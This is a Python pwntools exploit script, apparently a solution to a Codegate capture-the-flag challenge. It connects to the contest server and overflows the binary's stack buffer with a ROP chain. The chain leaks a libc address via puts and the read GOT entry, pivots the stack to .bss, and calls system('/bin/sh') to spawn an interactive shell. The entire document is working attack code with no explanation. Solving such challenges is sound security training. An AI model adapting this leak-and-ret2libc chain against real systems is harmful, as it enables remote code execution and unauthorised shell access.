from pwn import *

# p = process('./BaskinRobins31')
p = remote('ch41l3ng3s.codegate.kr', 3131)

p.recvuntil('(1-3)\n')

pop_rdi_ret = 0x00400bc3
pop_rsi_rdx_ret = 0x0040087b
pop_rbp_ret = 0x004007e0
leave_ret = 0x00400979
puts_plt = 0x4006c0
read_got = 0x602040

read_plt = 0x400700
bss = 0x602800

payload = '0\n'
payload = payload.rjust(0xb0, 'A')
payload += 'B' * 0x8
payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_rdx_ret)
payload += p64(bss)
payload += p64(32)
payload += p64(read_plt)
payload += p64(pop_rbp_ret)
payload += p64(bss)
payload += p64(leave_ret)
payload = payload.ljust(0x190, 'C')

# raw_input('wait')
p.send(payload)

p.recvuntil(':( \n')
leak = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
print hex(leak)

libc_base = leak - 0xf7250
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57

rop = 'A' * 8
rop += p64(pop_rdi_ret)
rop += p64(binsh)
rop += p64(system)
p.send(rop)

p.interactive()
